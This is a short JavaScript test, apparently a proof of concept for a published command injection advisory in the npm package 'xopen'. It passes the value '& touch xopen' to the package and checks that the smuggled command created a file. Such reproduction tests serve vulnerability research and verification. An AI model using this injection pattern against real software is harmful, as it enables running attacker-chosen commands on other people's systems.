//https://snyk.io/vuln/SNYK-JS-XOPEN-1050981
test("Command Injection in xopen", () => 
{
    const root = require("xopen");
	const fs = require('fs')
	const path = './xopen'
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
    let attack_code = "& touch xopen";
    root(attack_code);
    
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
